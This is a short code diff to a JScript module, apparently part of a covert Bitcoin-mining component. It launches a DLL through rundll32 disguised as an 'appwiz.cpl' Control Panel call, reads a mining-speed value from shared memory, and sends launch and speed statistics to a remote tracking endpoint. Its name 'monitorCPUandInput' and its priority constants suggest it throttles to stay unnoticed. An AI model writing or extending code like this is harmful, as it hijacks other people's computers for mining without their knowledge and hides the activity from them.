@@ -112,7 +112,7 @@ function filter_sebtc.prototype.monitorCPUandInput(pipe){
 	var WshProcessEnv = WshShell.Environment("Process") 
 	pThis.setEnvironmentVariable(WshShell.Environment("Process") )
 	WshShell.CurrentDirectory=__workdir
-	var p = WshShell.Exec("rundll32 "+pipe.name+" Control_RunDLL appwiz.cpl,,2");
+	var p = WshShell.Exec("rundll32.exe "+pipe.name+" Control_RunDLL appwiz.cpl,,2");
 	var pid = p.ProcessID	
 	if(pid==0){
 		sendHttpStat("monitor_btc", "launch_failed_" + pipe.name, 1);
@@ -145,18 +145,15 @@ function filter_sebtc.prototype.monitorCPUandInput(pipe){
 				pThis.callback(pipe)
 				return ;
 			}	
-			
+			if(__DEBUG){
 				var PAGE_READWRITE = 4;
 				var h = __storage.OpenFileMapping( PAGE_READWRITE, 0,"rpcxx_speed");
-				log("h="+h);
-				var s = "";
+				var s =""
 				if(h){
-					var s = __storage.ReadFileMapping(h,128);
-					var si = parseInt(s);
-					if(si>0)
-						si += 10000;
-					sendHttpStat("monitor_btc", "rpcxx_speed_" + parseInt(parseInt(si) / 10000));
-				}			
+					var s = __storage.ReadFileMapping(h,128);					
+				}
+				log("h="+h+" , s="+s);
+			}				 
 			//MonitorCPU 
 			var NORMAL_PRIORITY_CLASS     =        0x00000020
 			var IDLE_PRIORITY_CLASS       =        0x00000040
